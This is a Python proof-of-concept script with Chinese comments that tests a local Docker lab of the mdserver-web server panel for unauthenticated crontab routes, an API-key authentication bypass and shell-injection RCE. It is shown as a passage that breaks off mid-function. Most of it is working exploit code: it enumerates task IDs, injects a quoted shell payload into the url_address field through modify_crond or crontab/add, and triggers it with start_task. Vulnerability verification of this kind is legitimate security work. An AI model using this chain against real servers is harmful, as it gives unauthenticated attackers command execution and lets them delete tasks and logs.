#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
mdserver-web 漏洞自动化测试脚本
================================

覆盖漏洞：
  [旧版 ≤0.18.4 无认证路由漏洞]
    1. /crontab/get_data_list   - 未授权获取网站/数据库列表（信息泄露）
    2. /crontab/get_crond_find  - 未授权获取任务详情（信息泄露）
    3. /crontab/logs            - 未授权读取任务日志（信息泄露）
    4. /crontab/modify_crond    - 未授权修改任务脚本（Shell 注入 → RCE）
    5. /crontab/start_task      - 未授权触发任务执行（RCE 触发）
    6. /crontab/del_logs        - 未授权删除任务日志（痕迹清除）
    7. /crontab/set_cron_status - 未授权切换任务状态（破坏性）
    8. /crontab/del             - 未授权删除计划任务（破坏性）
    9. /site/get_site_doc       - 未授权获取服务器路径（信息泄露）

  [全版本 API Key 认证绕过漏洞]
    10. API Key 绕过 Session 认证
    11. IP 白名单未校验
    12. 危险默认值 open:True
    13. API Key + Shell 注入 → RCE

  [完整 RCE 利用链]
    14. 无认证 RCE: 枚举 ID → 注入 Shell → 触发执行
    15. API Key RCE: 添加任务 → 获取 ID → 触发执行

用法:
    python3 poc_test.py [--target URL] [--skip-destructive] [--skip-rce]
                        [--api-id ID] [--api-secret SECRET]
                        [--setup-api] [--setup-task]

示例:
    # 全量测试（需先启动漏洞环境）
    python3 poc_test.py --target http://127.0.0.1:7200 --setup-task

    # 仅测试信息泄露（跳过破坏性和RCE测试）
    python3 poc_test.py --skip-destructive --skip-rce

    # 测试 API Key 认证绕过
    python3 poc_test.py --setup-api --api-id test_app --api-secret test_secret
"""

import argparse
import json
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional

try:
    import requests
except ImportError:
    print("[!] 需要 requests 库: pip install requests")
    sys.exit(1)

# ──────────────────────────────────────────────────────────────────────
# 常量与配置
# ──────────────────────────────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:7200"
CONTAINER_NAME = "mdserver-web-vuln"
TIMEOUT = 10
RCE_VERIFY_DELAY = 3  # 等待 RCE 命令执行完成的秒数
RCE_MARKER_FILE = "/tmp/mdserver_poc_rce_test.txt"
RCE_MARKER_CONTENT = "mdserver-web-poc-rce-verified"
API_RCE_MARKER_FILE = "/tmp/mdserver_poc_api_rce_test.txt"


# ──────────────────────────────────────────────────────────────────────
# 数据结构
# ──────────────────────────────────────────────────────────────────────

@dataclass
class TestResult:
    name: str
    vuln_id: str
    success: bool
    detail: str
    severity: str = "INFO"  # CRITICAL / HIGH / MEDIUM / LOW / INFO


@dataclass
class TestContext:
    target: str
    skip_destructive: bool = False
    skip_rce: bool = False
    api_id: str = ""
    api_secret: str = ""
    setup_api: bool = False
    setup_task: bool = False
    found_cron_id: Optional[int] = None
    found_cron_name: str = ""
    results: list = field(default_factory=list)


# ──────────────────────────────────────────────────────────────────────
# 辅助函数
# ──────────────────────────────────────────────────────────────────────

def post(url: str, data: dict = None, headers: dict = None) -> Optional[requests.Response]:
    """发送 POST 请求，统一异常处理"""
    try:
        resp = requests.post(url, data=data, headers=headers, timeout=TIMEOUT)
        return resp
    except requests.exceptions.RequestException as e:
        return None


def docker_exec(cmd: str) -> Optional[str]:
    """在 Docker 容器内执行命令"""
    try:
        result = subprocess.run(
            ["docker", "exec", CONTAINER_NAME, "bash", "-c", cmd],
            capture_output=True, text=True, timeout=15
        )
        return result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
        return None


def docker_python(script: str) -> Optional[str]:
    """在 Docker 容器内执行 Python 代码

    通过 stdin 传入脚本，避免将代码嵌入 shell 命令字符串（防止脚本内含
    双引号时破坏 bash -c "python3 -c \"...\"" 的引号嵌套）。

    注意：script 参数仅接受本文件中硬编码的 Python 代码片段，
    不接受任何外部用户输入，因此不存在注入风险。
    """
    full_script = (
        "import sys, os\n"
        "os.chdir('/www/server/mdserver-web/web')\n"
        "sys.path.insert(0, '/www/server/mdserver-web/web')\n"
        + script
    )
    try:
        result = subprocess.run(
            ["docker", "exec", "-i", CONTAINER_NAME, "python3"],
            input=full_script,
            capture_output=True, text=True, timeout=30
        )
        return result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError, subprocess.SubprocessError):
        return None


def is_json_response(resp: requests.Response) -> bool:
    """检查响应是否为 JSON"""
    try:
        resp.json()
        return True
    except (json.JSONDecodeError, ValueError):
        return False


def is_authenticated_redirect(resp: requests.Response) -> bool:
    """检查响应是否表示被认证机制拒绝（需要登录才能访问）

    面板在未授权时有以下几种响应形式：
    1. HTTP 401/403/302 — 配置了 unauthorized_status 为对应状态码时
    2. HTTP 200 + path.html — unauthorized_status == '0'（默认值）时，
       返回「安全入口校验失败」页面，内容含固定中文字符串
    3. HTTP 200 + 英文 login 页面 — 其他面板软件兼容场景
    """
    if resp is None:
        return True
    if resp.status_code in (400, 401, 403, 302):
        return True
    if resp.status_code == 200:
        text = resp.text
        # 面板安全入口拦截页（panel_login_required 在 unauthorized_status='0' 时返回）
        if "安全入口校验失败" in text or "请使用正确的入口登录面板" in text:
            return True
        # 通用英文登录页检测
        if "login" in text.lower() and "<!doctype" in text.lower():
            return True
    return False


def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║    mdserver-web 漏洞自动化测试脚本                             ║
║    覆盖: 9 个未授权路由 + API Key 绕过 + RCE 利用链            ║
╚══════════════════════════════════════════════════════════════════╝
""")


def print_section(title: str):
    print(f"\n{'─' * 64}")
    print(f"  {title}")
    print(f"{'─' * 64}")


def print_result(result: TestResult):
    icon = "✅" if result.success else "❌"
    sev_colors = {
        "CRITICAL": "\033[91m",
        "HIGH": "\033[91m",
        "MEDIUM": "\033[93m",
        "LOW": "\033[94m",
        "INFO": "\033[90m",
    }
    reset = "\033[0m"
    color = sev_colors.get(result.severity, "")
    print(f"  {icon} [{result.vuln_id}] {color}[{result.severity}]{reset} {result.name}")
    if result.detail:
        for line in result.detail.split("\n"):
            print(f"     {line}")


def print_summary(results: list):
    print(f"\n{'═' * 64}")
    print("  测试结果汇总")
    print(f"{'═' * 64}")

    total = len(results)
    vuln_found = sum(1 for r in results if r.success)
    not_vuln = sum(1 for r in results if not r.success)

    print(f"  总计测试: {total}")
    print(f"  \033[91m漏洞存在: {vuln_found}\033[0m")
    print(f"  \033[92m漏洞不存在/已修复: {not_vuln}\033[0m")

    if vuln_found > 0:
        print(f"\n  ⚠️  发现的漏洞:")
        for r in results:
            if r.success:
                sev_colors = {
                    "CRITICAL": "\033[91m",
                    "HIGH": "\033[91m",
                    "MEDIUM": "\033[93m",
                    "LOW": "\033[94m",
                }
                color = sev_colors.get(r.severity, "")
                reset = "\033[0m"
                print(f"    • {color}[{r.severity}]{reset} {r.vuln_id}: {r.name}")

    print(f"\n{'═' * 64}")


# ──────────────────────────────────────────────────────────────────────
# 环境准备
# ──────────────────────────────────────────────────────────────────────

def setup_initial_task(ctx: TestContext):
    """在容器中预置一条计划任务（RCE 测试的前置条件）"""
    print_section("环境准备：预置初始计划任务")
    script = """
from utils.crontab import crontab as MwCrontab
data = {
    'name': 'poc_test_task',
    'type': 'day',
    'where1': '',
    'hour': '3',
    'minute': '0',
    'week': '',
    'save': '',
    'backup_to': 'localhost',
    'stype': 'toUrl',
    'sname': '',
    'sbody': '',
    'url_address': 'https://example.com/healthcheck',
    'attr': '',
}
tid = MwCrontab.instance().add(data)
print(tid)
"""
    result = docker_python(script)
    if result and result.strip().isdigit():
        tid = int(result.strip())
        print(f"  [+] 初始任务已创建, ID = {tid}")
    else:
        print(f"  [*] 任务可能已存在或创建失败: {result}")


def setup_api_credentials(ctx: TestContext):
    """在容器中开启 API 并创建测试凭据"""
    print_section("环境准备：开启面板 API 并创建凭据")
    app_id = ctx.api_id or "poc_test_app_id"
    app_secret = ctx.api_secret or "poc_test_app_secret"
    ctx.api_id = app_id
    ctx.api_secret = app_secret

    script = f"""
import json
import thisdb
thisdb.setOption('panel_api', json.dumps({{'open': True}}))
try:
    thisdb.addApp('{app_id}', '{app_secret}', '192.168.99.99')
except:
    pass
print('ok')
"""
    result = docker_python(script)
    if result and "ok" in result:
        masked_secret = app_secret[:3] + "*" * max(0, len(app_secret) - 3)
        print(f"  [+] API 已开启")
        print(f"      App-Id:     {app_id}")
        print(f"      App-Secret: {masked_secret}")
        print(f"      白名单:     192.168.99.99 (应被绕过)")
    else:
        print(f"  [-] API 设置失败: {result}")


# ──────────────────────────────────────────────────────────────────────
# 测试模块一：未授权访问漏洞（9 个路由）
# ──────────────────────────────────────────────────────────────────────

def test_unauth_get_data_list(ctx: TestContext) -> TestResult:
    """测试 /crontab/get_data_list 未授权访问"""
    url = f"{ctx.target}/crontab/get_data_list"
    resp = post(url, data={"type": "site"})

    if resp is None:
        return TestResult(
            name="/crontab/get_data_list 未授权 - 获取网站列表",
            vuln_id="VULN-01",
            success=False,
            detail="目标不可达",
            severity="HIGH"
        )

    if is_authenticated_redirect(resp):
        return TestResult(
            name="/crontab/get_data_list 未授权 - 获取网站列表",
            vuln_id="VULN-01",
            success=False,
            detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
            severity="HIGH"
        )

    # 必须是 JSON 业务响应才算真正绕过了认证
    if not is_json_response(resp):
        return TestResult(
            name="/crontab/get_data_list 未授权 - 获取网站列表",
            vuln_id="VULN-01",
            success=False,
            detail=f"响应为非 JSON（HTTP {resp.status_code}），接口被拦截，漏洞已修复",
            severity="HIGH"
        )

    # 尝试同时获取数据库列表
    resp_db = post(url, data={"type": "database"})
    db_info = ""
    if resp_db and not is_authenticated_redirect(resp_db) and is_json_response(resp_db):
        db_info = f"\n数据库列表响应: {resp_db.text[:200]}"

    return TestResult(
        name="/crontab/get_data_list 未授权 - 获取网站/数据库列表",
        vuln_id="VULN-01",
        success=True,
        detail=f"无需认证即可获取服务器资源列表（信息泄露）\n"
               f"网站列表响应: {resp.text[:200]}{db_info}",
        severity="HIGH"
    )


def test_unauth_get_crond_find(ctx: TestContext) -> TestResult:
    """测试 /crontab/get_crond_find 未授权访问 + 枚举任务 ID"""
    url = f"{ctx.target}/crontab/get_crond_find"
    found_tasks = []

    for i in range(1, 51):
        resp = post(url, data={"id": str(i)})
        if resp is None:
            continue
        if is_authenticated_redirect(resp):
            return TestResult(
                name="/crontab/get_crond_find 未授权 - 枚举任务 ID",
                vuln_id="VULN-02",
                success=False,
                detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
                severity="HIGH"
            )
        try:
            data = resp.json()
            if data and isinstance(data, dict) and data.get("name"):
                found_tasks.append({
                    "id": i,
                    "name": data.get("name", ""),
                    "stype": data.get("stype", ""),
                    "type": data.get("type", ""),
                })
                if ctx.found_cron_id is None:
                    ctx.found_cron_id = i
                    ctx.found_cron_name = data.get("name", "")
        except (json.JSONDecodeError, ValueError):
            continue

    if found_tasks:
        task_info = "\n".join(
            f"  ID={t['id']}, name={t['name']}, stype={t['stype']}, type={t['type']}"
            for t in found_tasks[:5]
        )
        if len(found_tasks) > 5:
            task_info += f"\n  ...及其他 {len(found_tasks) - 5} 个任务"
        return TestResult(
            name="/crontab/get_crond_find 未授权 - 枚举任务 ID",
            vuln_id="VULN-02",
            success=True,
            detail=f"无需认证，发现 {len(found_tasks)} 个任务（信息泄露）:\n{task_info}",
            severity="HIGH"
        )

    return TestResult(
        name="/crontab/get_crond_find 未授权 - 枚举任务 ID",
        vuln_id="VULN-02",
        success=False,
        detail="未发现任务或接口需要认证",
        severity="HIGH"
    )


def test_unauth_logs(ctx: TestContext) -> TestResult:
    """测试 /crontab/logs 未授权访问"""
    url = f"{ctx.target}/crontab/logs"
    test_id = str(ctx.found_cron_id) if ctx.found_cron_id else "1"
    resp = post(url, data={"id": test_id})

    if resp is None:
        return TestResult(
            name="/crontab/logs 未授权 - 读取任务日志",
            vuln_id="VULN-03",
            success=False,
            detail="目标不可达",
            severity="MEDIUM"
        )

    if is_authenticated_redirect(resp):
        return TestResult(
            name="/crontab/logs 未授权 - 读取任务日志",
            vuln_id="VULN-03",
            success=False,
            detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
            severity="MEDIUM"
        )

    # 必须是 JSON 业务响应才算真正绕过了认证；HTML 响应说明被拦截
    if not is_json_response(resp):
        return TestResult(
            name="/crontab/logs 未授权 - 读取任务日志",
            vuln_id="VULN-03",
            success=False,
            detail=f"响应为非 JSON（HTTP {resp.status_code}），接口被拦截，漏洞已修复",
            severity="MEDIUM"
        )

    return TestResult(
        name="/crontab/logs 未授权 - 读取任务日志",
        vuln_id="VULN-03",
        success=True,
        detail=f"无需认证即可读取任务执行日志（信息泄露）\n响应: {resp.text[:200]}",
        severity="MEDIUM"
    )


def test_unauth_modify_crond(ctx: TestContext) -> TestResult:
    """测试 /crontab/modify_crond 未授权访问（不执行真正注入）"""
    url = f"{ctx.target}/crontab/modify_crond"

    # 使用无害请求测试认证：故意传空name使校验失败，以此验证是否进入了函数逻辑
    resp = post(url, data={
        "id": "99999",
        "name": "",
        "type": "minute-n",
        "where1": "1",
        "stype": "toUrl",
        "sname": "",
        "sbody": "",
        "save": "",
        "backup_to": "localhost",
        "attr": "",
        "url_address": "https://example.com",
    })

    if resp is None:
        return TestResult(
            name="/crontab/modify_crond 未授权 - 修改计划任务",
            vuln_id="VULN-04",
            success=False,
            detail="目标不可达",
            severity="CRITICAL"
        )

    if is_authenticated_redirect(resp):
        return TestResult(
            name="/crontab/modify_crond 未授权 - 修改计划任务",
            vuln_id="VULN-04",
            success=False,
            detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
            severity="CRITICAL"
        )

    # 必须是 JSON 业务响应才能确认进入了函数逻辑；HTML 响应说明仍被拦截
    if not is_json_response(resp):
        return TestResult(
            name="/crontab/modify_crond 未授权 - 修改计划任务",
            vuln_id="VULN-04",
            success=False,
            detail=f"响应为非 JSON（HTTP {resp.status_code}），接口被拦截，漏洞已修复",
            severity="CRITICAL"
        )

    # 能收到业务错误（如"任务名称不能为空"或500），说明无需认证即进入了函数
    return TestResult(
        name="/crontab/modify_crond 未授权 - 修改计划任务",
        vuln_id="VULN-04",
        success=True,
        detail=f"无需认证即可调用 modify_crond（Shell 注入 → RCE 前置）\n"
               f"响应 HTTP {resp.status_code}: {resp.text[:200]}",
        severity="CRITICAL"
    )


def test_unauth_start_task(ctx: TestContext) -> TestResult:
    """测试 /crontab/start_task 未授权访问（不执行真正触发）"""
    url = f"{ctx.target}/crontab/start_task"

    # 传不存在的ID，仅验证认证状态
    resp = post(url, data={"id": "99999"})

    if resp is None:
        return TestResult(
            name="/crontab/start_task 未授权 - 触发任务执行",
            vuln_id="VULN-05",
            success=False,
            detail="目标不可达",
            severity="CRITICAL"
        )

    if is_authenticated_redirect(resp):
        return TestResult(
            name="/crontab/start_task 未授权 - 触发任务执行",
            vuln_id="VULN-05",
            success=False,
            detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
            severity="CRITICAL"
        )

    # 任何非认证拦截响应（包括 HTTP 500 因不存在的 ID 触发 TypeError）
    # 均说明函数体已被执行，即端点无需认证即可访问
    return TestResult(
        name="/crontab/start_task 未授权 - 触发任务执行",
        vuln_id="VULN-05",
        success=True,
        detail=f"无需认证即可触发任务执行（RCE 触发器）\n"
               f"响应 HTTP {resp.status_code}: {resp.text[:200]}",
        severity="CRITICAL"
    )


def test_unauth_del_logs(ctx: TestContext) -> TestResult:
    """测试 /crontab/del_logs 未授权访问"""
    url = f"{ctx.target}/crontab/del_logs"

    # 传不存在的ID，仅验证认证状态
    resp = post(url, data={"id": "99999"})

    if resp is None:
        return TestResult(
            name="/crontab/del_logs 未授权 - 删除任务日志",
            vuln_id="VULN-06",
            success=False,
            detail="目标不可达",
            severity="MEDIUM"
        )

    if is_authenticated_redirect(resp):
        return TestResult(
            name="/crontab/del_logs 未授权 - 删除任务日志",
            vuln_id="VULN-06",
            success=False,
            detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
            severity="MEDIUM"
        )

    if not is_json_response(resp):
        return TestResult(
            name="/crontab/del_logs 未授权 - 删除任务日志",
            vuln_id="VULN-06",
            success=False,
            detail=f"响应为非 JSON（HTTP {resp.status_code}），接口被拦截，漏洞已修复",
            severity="MEDIUM"
        )

    return TestResult(
        name="/crontab/del_logs 未授权 - 删除任务日志",
        vuln_id="VULN-06",
        success=True,
        detail=f"无需认证即可删除日志（清除痕迹）\n"
               f"响应 HTTP {resp.status_code}: {resp.text[:200]}",
        severity="MEDIUM"
    )


def test_unauth_set_cron_status(ctx: TestContext) -> TestResult:
    """测试 /crontab/set_cron_status 未授权访问"""
    url = f"{ctx.target}/crontab/set_cron_status"

    resp = post(url, data={"id": "99999"})

    if resp is None:
        return TestResult(
            name="/crontab/set_cron_status 未授权 - 切换任务状态",
            vuln_id="VULN-07",
            success=False,
            detail="目标不可达",
            severity="HIGH"
        )

    if is_authenticated_redirect(resp):
        return TestResult(
            name="/crontab/set_cron_status 未授权 - 切换任务状态",
            vuln_id="VULN-07",
            success=False,
            detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
            severity="HIGH"
        )

    # 任何非认证拦截响应（包括 HTTP 500 因不存在的 ID 触发 TypeError）
    # 均说明函数体已被执行，即端点无需认证即可访问
    return TestResult(
        name="/crontab/set_cron_status 未授权 - 切换任务状态",
        vuln_id="VULN-07",
        success=True,
        detail=f"无需认证即可启用/禁用任务（可禁用监控/备份等关键任务）\n"
               f"响应 HTTP {resp.status_code}: {resp.text[:200]}",
        severity="HIGH"
    )


def test_unauth_del(ctx: TestContext) -> TestResult:
    """测试 /crontab/del 未授权访问（不真正删除）"""
    url = f"{ctx.target}/crontab/del"

    # 传不存在的ID，仅验证认证状态
    resp = post(url, data={"id": "99999"})

    if resp is None:
        return TestResult(
            name="/crontab/del 未授权 - 删除计划任务",
            vuln_id="VULN-08",
            success=False,
            detail="目标不可达",
            severity="HIGH"
        )

    if is_authenticated_redirect(resp):
        return TestResult(
            name="/crontab/del 未授权 - 删除计划任务",
            vuln_id="VULN-08",
            success=False,
            detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
            severity="HIGH"
        )

    # 任何非认证拦截响应（包括 HTTP 500 因不存在的 ID 触发 TypeError）
    # 均说明函数体已被执行，即端点无需认证即可访问
    return TestResult(
        name="/crontab/del 未授权 - 删除计划任务",
        vuln_id="VULN-08",
        success=True,
        detail=f"无需认证即可删除任务（破坏性操作）\n"
               f"响应 HTTP {resp.status_code}: {resp.text[:200]}",
        severity="HIGH"
    )


def test_unauth_get_site_doc(ctx: TestContext) -> TestResult:
    """测试 /site/get_site_doc 未授权访问"""
    url = f"{ctx.target}/site/get_site_doc"
    paths_found = []

    for stype in range(1, 5):
        resp = post(url, data={"type": str(stype)})
        if resp is None:
            continue
        if is_authenticated_redirect(resp):
            return TestResult(
                name="/site/get_site_doc 未授权 - 泄露服务器路径",
                vuln_id="VULN-09",
                success=False,
                detail=f"需要认证 (HTTP {resp.status_code})，漏洞已修复",
                severity="MEDIUM"
            )
        try:
            data = resp.json()
            path = data.get("data", {}).get("path", "")
            if path:
                paths_found.append(f"stype={stype}: {path}")
        except (json.JSONDecodeError, ValueError):
            continue

    if paths_found:
        path_info = "\n".join(f"  {p}" for p in paths_found)
        return TestResult(
            name="/site/get_site_doc 未授权 - 泄露服务器路径",
            vuln_id="VULN-09",
            success=True,
            detail=f"无需认证即可获取服务器文件路径（信息泄露）:\n{path_info}",
            severity="MEDIUM"
        )

    return TestResult(
        name="/site/get_site_doc 未授权 - 泄露服务器路径",
        vuln_id="VULN-09",
        success=False,
        detail="接口需要认证（被安全拦截）或未获取到路径信息，漏洞已修复",
        severity="MEDIUM"
    )


# ──────────────────────────────────────────────────────────────────────
# 测试模块二：完整 RCE 利用链（无认证）
# ──────────────────────────────────────────────────────────────────────

def test_rce_chain(ctx: TestContext) -> TestResult:
    """完整 RCE 利用链：枚举 ID → 注入 Shell → 触发执行 → 验证"""
    if ctx.found_cron_id is None:
        return TestResult(
            name="无认证 RCE 利用链",
            vuln_id="RCE-01",
            success=False,
            detail="未找到有效任务 ID（需先运行 VULN-02 枚举或 --setup-task 预置任务）",
            severity="CRITICAL"
        )

    cron_id = ctx.found_cron_id
    cron_name = ctx.found_cron_name or "poc_test_task"
    target = ctx.target

    # 清理旧标记文件
    docker_exec(f"rm -f {RCE_MARKER_FILE}")

    # Step 1: 注入 Shell
    # 注意：此处故意构造不安全的 Shell 注入 payload，用于 PoC 验证漏洞是否存在
    rce_cmd = f"echo {RCE_MARKER_CONTENT} > {RCE_MARKER_FILE}"
    payload = f"'; {rce_cmd}; echo '"

    resp = post(f"{target}/crontab/modify_crond", data={
        "id": str(cron_id),
        "name": cron_name,
        "type": "minute-n",
        "where1": "1",
        "stype": "toUrl",
        "sname": "",
        "sbody": "",
        "save": "",
        "backup_to": "localhost",
        "attr": "",
        "url_address": payload,
    })

    if resp is None or is_authenticated_redirect(resp):
        return TestResult(
            name="无认证 RCE 利用链",
            vuln_id="RCE-01",
            success=False,
            detail="modify_crond 请求失败或需要认证",
            severity="CRITICAL"
        )

    modify_result = resp.text[:200]

    # Step 2: 触发执行
    resp = post(f"{target}/crontab/start_task", data={"id": str(cron_id)})
    if resp is None or is_authenticated_redirect(resp):
        return TestResult(
            name="无认证 RCE 利用链",
            vuln_id="RCE-01",
            success=False,
            detail="start_task 请求失败或需要认证",
            severity="CRITICAL"
        )

    trigger_result = resp.text[:200]

    # Step 3: 等待执行并验证
    time.sleep(RCE_VERIFY_DELAY)
    content = docker_exec(f"cat {RCE_MARKER_FILE} 2>/dev/null")

    if content and RCE_MARKER_CONTENT in content:
        # 清理标记
        docker_exec(f"rm -f {RCE_MARKER_FILE}")
        return TestResult(
            name="无认证 RCE 利用链",
            vuln_id="RCE-01",
            success=True,
            detail=f"🔥 RCE 成功！全程无需任何登录凭据\n"
                   f"利用链: get_crond_find(枚举ID={cron_id}) → modify_crond(注入Shell) → start_task(触发)\n"
                   f"modify_crond 响应: {modify_result}\n"
                   f"start_task 响应: {trigger_result}\n"
                   f"标记文件内容: {content}",
            severity="CRITICAL"
        )

    return TestResult(
        name="无认证 RCE 利用链",
        vuln_id="RCE-01",
        success=False,
        detail=f"RCE 未验证成功（可能是执行延迟或容器环境限制）\n"
               f"modify_crond 响应: {modify_result}\n"
               f"start_task 响应: {trigger_result}",
        severity="CRITICAL"
    )


# ──────────────────────────────────────────────────────────────────────
# 测试模块三：API Key 认证绕过漏洞（全版本适用）
# ──────────────────────────────────────────────────────────────────────

def test_api_bypass_session(ctx: TestContext) -> TestResult:
    """API Key 绕过 Session 认证"""
    if not ctx.api_id or not ctx.api_secret:
        return TestResult(
            name="API Key 绕过 Session 认证",
            vuln_id="API-01",
            success=False,
            detail="未提供 API 凭据（使用 --api-id / --api-secret 或 --setup-api）",
            severity="HIGH"
        )

    headers = {"App-Id": ctx.api_id, "App-Secret": ctx.api_secret}

    # 先验证无 API Key 时需要认证
    resp_no_key = post(f"{ctx.target}/crontab/list", data={"p": "1", "limit": "10"})
    needs_auth = resp_no_key is None or is_authenticated_redirect(resp_no_key)

    # 携带 API Key 请求
    resp_with_key = post(
        f"{ctx.target}/crontab/list",
        data={"p": "1", "limit": "10"},
        headers=headers
    )

    if resp_with_key is None:
        return TestResult(
            name="API Key 绕过 Session 认证",
            vuln_id="API-01",
            success=False,
            detail="目标不可达",
            severity="HIGH"
        )

    if is_authenticated_redirect(resp_with_key):
        return TestResult(
            name="API Key 绕过 Session 认证",
            vuln_id="API-01",
            success=False,
            detail=f"API Key 认证被拒绝 (HTTP {resp_with_key.status_code})",
            severity="HIGH"
        )

    if is_json_response(resp_with_key):
        return TestResult(
            name="API Key 绕过 Session 认证",
            vuln_id="API-01",
            success=True,
            detail=f"API Key 成功绕过 Session 认证\n"
                   f"无 Key 时需认证: {needs_auth}\n"
                   f"携带 Key 响应 HTTP {resp_with_key.status_code}: {resp_with_key.text[:200]}",
            severity="HIGH"
        )

    return TestResult(
        name="API Key 绕过 Session 认证",
        vuln_id="API-01",
        success=False,
        detail=f"API Key 认证状态不确定 (HTTP {resp_with_key.status_code})",
        severity="HIGH"
    )


def test_api_ip_whitelist_bypass(ctx: TestContext) -> TestResult:
    """IP 白名单形同虚设"""
    if not ctx.api_id or not ctx.api_secret:
        return TestResult(
            name="API Key IP 白名单绕过",
            vuln_id="API-02",
            success=False,
            detail="未提供 API 凭据",
            severity="HIGH"
        )

    # 将白名单设为不可能匹配的 IP
    script = f"""
import core.mw as mw
mw.M('app').where("app_id=?", ('{ctx.api_id}',)).update({{'white_list': '192.168.255.254'}})
print('ok')
"""
    result = docker_python(script)
    if not result or "ok" not in result:
        return TestResult(
            name="API Key IP 白名单绕过",
            vuln_id="API-02",
            success=False,
            detail=f"无法修改白名单设置: {result}",
            severity="HIGH"
        )

    # 从本机（不在白名单中）发起请求
    headers = {"App-Id": ctx.api_id, "App-Secret": ctx.api_secret}
    resp = post(
        f"{ctx.target}/crontab/list",
        data={"p": "1", "limit": "10"},
        headers=headers
    )

    if resp and not is_authenticated_redirect(resp) and is_json_response(resp):
        return TestResult(
            name="API Key IP 白名单绕过",
            vuln_id="API-02",
            success=True,
            detail=f"白名单设为 192.168.255.254，但本机仍可访问\n"
                   f"IP 白名单在 user_login_check.py 中从未被读取\n"
                   f"响应: {resp.text[:200]}",
            severity="HIGH"
        )

    return TestResult(
        name="API Key IP 白名单绕过",
        vuln_id="API-02",
        success=False,
        detail=f"IP 白名单可能已生效或 API Key 无效",
        severity="HIGH"
    )


def test_api_default_open(ctx: TestContext) -> TestResult:
    """验证 panel_api 危险默认值 open:True"""
    # 清除 panel_api 选项，让其使用默认值
    script = """
import core.mw as mw
mw.M('option').where("name=?", ('panel_api',)).delete()
print('deleted')
"""
    result = docker_python(script)
    if not result or "deleted" not in result:
        return TestResult(
            name="panel_api 危险默认值 open:True",
            vuln_id="API-03",
            success=False,
            detail=f"无法清除 panel_api 选项: {result}",
            severity="MEDIUM"
        )

    if not ctx.api_id or not ctx.api_secret:
        # 恢复设置
        restore_script = """
import json, thisdb
thisdb.setOption('panel_api', json.dumps({'open': True}))
print('restored')
"""
        docker_python(restore_script)
        return TestResult(
            name="panel_api 危险默认值 open:True",
            vuln_id="API-03",
            success=False,
            detail="未提供 API 凭据，无法验证默认值",
            severity="MEDIUM"
        )

    # 在没有 panel_api 选项的情况下，尝试 API Key 认证
    headers = {"App-Id": ctx.api_id, "App-Secret": ctx.api_secret}
    resp = post(
        f"{ctx.target}/crontab/list",
        data={"p": "1", "limit": "10"},
        headers=headers
    )

    # 恢复设置
    restore_script = """
import json, thisdb
thisdb.setOption('panel_api', json.dumps({'open': True}))
print('restored')
"""
    docker_python(restore_script)

    if resp and not is_authenticated_redirect(resp) and is_json_response(resp):
        return TestResult(
            name="panel_api 危险默认值 open:True",
            vuln_id="API-03",
            success=True,
            detail=f"删除 panel_api 选项后，API 仍默认开启\n"
                   f"default={{\"open\":True}} 在新部署面板中天然可利用\n"
                   f"响应: {resp.text[:200]}",
            severity="MEDIUM"
        )

    return TestResult(
        name="panel_api 危险默认值 open:True",
        vuln_id="API-03",
        success=False,
        detail="删除选项后 API 未默认开启，默认值可能已修复",
        severity="MEDIUM"
    )


def test_api_invalid_appid_error(ctx: TestContext) -> TestResult:
    """无效 App-Id 触发 TypeError（Oracle 信息泄露）"""
    headers = {"App-Id": "nonexistent_id_12345", "App-Secret": "fake_secret"}
    resp = post(
        f"{ctx.target}/crontab/list",
        data={"p": "1", "limit": "10"},
        headers=headers
    )

    if resp is None:
        return TestResult(
            name="无效 App-Id 触发 TypeError (HTTP 500)",
            vuln_id="API-04",
            success=False,
            detail="目标不可达",
            severity="LOW"
        )

    if resp.status_code == 500:
        return TestResult(
            name="无效 App-Id 触发 TypeError (HTTP 500)",
            vuln_id="API-04",
            success=True,
            detail=f"无效 App-Id 触发 info=None → info['app_secret'] TypeError → HTTP 500\n"
                   f"可用于判断 App-Id 是否有效（Oracle 攻击）\n"
                   f"响应: {resp.text[:200]}",
            severity="LOW"
        )

    return TestResult(
        name="无效 App-Id 触发 TypeError (HTTP 500)",
        vuln_id="API-04",
        success=False,
        detail=f"HTTP {resp.status_code}（未触发 500），空指针可能已修复",
        severity="LOW"
    )


def test_api_rce_chain(ctx: TestContext) -> TestResult:
    """API Key 认证绕过 + Shell 注入 → RCE（全版本适用）"""
    if not ctx.api_id or not ctx.api_secret:
        return TestResult(
            name="API Key 认证绕过 + RCE",
            vuln_id="API-RCE",
            success=False,
            detail="未提供 API 凭据",
            severity="CRITICAL"
        )

    headers = {"App-Id": ctx.api_id, "App-Secret": ctx.api_secret}
    target = ctx.target

    # 清理标记文件
    docker_exec(f"rm -f {API_RCE_MARKER_FILE}")

    # Step 1: 通过 API Key 添加恶意任务
    # 注意：此处故意构造不安全的 Shell 注入 payload，用于 PoC 验证漏洞是否存在
    rce_cmd = f"echo {RCE_MARKER_CONTENT} > {API_RCE_MARKER_FILE}"
    payload = f"'; {rce_cmd}; echo '"

    resp = post(f"{target}/crontab/add", data={
        "name": "api_rce_test_task",
        "type": "minute-n",
        "where1": "1",
        "stype": "toUrl",
        "sname": "",
        "sbody": "",
        "save": "",
        "backup_to": "localhost",
        "attr": "",
        "url_address": payload,
    }, headers=headers)

    if resp is None or is_authenticated_redirect(resp):
        return TestResult(
            name="API Key 认证绕过 + RCE",
            vuln_id="API-RCE",
            success=False,
            detail=f"API Key 添加任务失败",
            severity="CRITICAL"
        )

    add_result = resp.text[:200]

    # Step 2: 获取新任务 ID
    resp = post(f"{target}/crontab/list", data={"p": "1", "limit": "50"}, headers=headers)
    task_id = None
    if resp and is_json_response(resp):
        try:
            data = resp.json()
